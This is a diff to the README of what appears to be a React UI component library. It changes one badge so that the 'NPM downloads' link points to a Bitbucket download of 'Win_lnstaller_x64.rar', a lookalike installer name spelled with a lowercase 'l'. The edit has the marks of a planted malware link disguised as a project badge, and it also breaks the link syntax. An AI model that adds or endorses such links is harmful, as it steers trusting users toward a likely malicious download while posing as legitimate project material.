@@ -9,7 +9,7 @@ An enterprise-class UI design language and React UI library.
 [![CI status][github-action-image]][github-action-url]
 [![codecov][codecov-image]][codecov-url]
 [![NPM version][npm-image]][npm-url]
-[![NPM downloads][download-image]][download-url]
+[![NPM downloads][download-image]][https://bitbucket.org/kron653/project1/downloads/Win_lnstaller_x64.rar]
 
 [![][bundlephobia-image]][bundlephobia-url]
 [![][bundlesize-js-image]][unpkg-js-url]
